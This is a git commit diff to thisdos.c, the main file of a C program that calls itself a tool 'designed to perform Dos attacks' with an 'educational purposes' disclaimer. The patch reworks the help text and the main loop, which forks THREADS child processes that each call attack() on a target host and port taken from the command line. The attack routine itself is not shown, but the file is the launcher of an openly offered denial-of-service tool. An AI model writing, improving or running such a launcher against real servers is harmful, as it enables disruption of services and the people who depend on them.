6c943ef4d4d52b8138145a27b0173f2116b6bbc5
Heisenberg <alimirmohammad.1386@gmail.com>
2024-03-06 23:15:18 -0500

    Minor patch

--- thisdos.c
+++ thisdos.c
@@ -3,13 +3,8 @@ This program is licensed under the GNU General Public License v3.
 Copyright (C) 2007 Free Software Foundation, Inc. <https://fsf.org/>
 See https://www.gnu.org/licenses/gpl-3.0.html for details.
 */
-#ifdef __WIN32__
-#warning "Running thisdos on the windows is not recommended,please visit the page https://github.com/HeisenbergCipherCracker/ThisDos to see the installation guide."
-#endif
 #include "libz/basedos.h"
 #include "libz/common.h"
-#include "libwebutil/ping.h"
-#include "libwebutil/findport.h"
 
 #include <stdio.h>
 #include <string.h>
@@ -21,31 +16,38 @@ static const char first_msg[] =
 "A tool designed to perform Dos attacks,only for educational purposes, not illegal!"
 "It is user end responsibility to obey the federal laws to ensure that this program does not make any harm to any server";
 static const char help_me[] = 
-"\nfirst parameter should be target"
-"\nsecond parameter should be port to perform attack"
-"\nuse --help for help menu";
+"\n--help: Show help menu\n";
 
 
 int main(int argc, char **argv) {
-	printf(first_msg);
-	print_program_banner();
-	int x;
-	for (int i = 0;i< argc;i++){
-		if (strcmp(argv[i],"--help") == 0){
-			printf(help_me);
-			exit(0);
-		}
+    if (argc < 3 || strcmp(argv[1], "--help") == 0) {
+        printf("Usage: %s <target> <port>\n", argv[0]);
+        printf("Options:\n");
+        printf("--help: Show help menu\n");
+        exit(1);
+    }
 
+    printf("ThisDos Project\n");
+    print_program_banner();
 
-	}
-	if(argc <3){
-		cycle_identity();
-	}
-	for(x=0; x != THREADS; x++) {
-		if(fork())
-			attack(argv[1], argv[2], x);
-		usleep(250000);
-	}
-	getc(stdin);
-	return 0;
+    for (int i = 1; i < argc; i++) {
+        if (strcmp(argv[i], "--help") == 0) {
+            printf("Usage: %s <target> <port>\n", argv[0]);
+            printf("Options:\n");
+            printf(help_me);
+            exit(0);
+        }
+    }
+
+    for (int x = 0; x < THREADS; x++) {
+        if (fork() == 0) {
+            attack(argv[1], argv[2], x);
+            exit(0);
+        }
+        usleep(250000);
+    }
+
+    // Wait for user input before exiting
+    getc(stdin);
+    return 0;
 }
